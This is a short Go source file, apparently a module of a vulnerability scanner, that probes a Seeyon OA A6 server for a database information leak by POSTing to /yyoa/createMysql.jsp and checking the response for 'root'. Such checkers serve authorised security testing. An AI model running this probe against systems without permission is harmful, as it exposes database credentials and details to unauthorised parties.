package A6_createMysql_information_leakage

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
)

func Run(url string) {
	vulnUrl := url + "/yyoa/createMysql.jsp"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).Post(vulnUrl)
	if err != nil {
		color.Red.Println("[-]	致远OA_A6数据库敏感信息泄露漏洞不存在")
		return
	}
	if resp.StatusCode == 200 && strings.Contains(resp.String(), "root") {
		color.Green.Println("[+]	致远OA A6-test.jsp-sqljni createMysql.jsp 数据库敏感信息泄露漏洞存在 -> " + url)
	} else {
		color.Red.Println("[-]	致远OA_A6数据库敏感信息泄露漏洞不存在")
	}
}
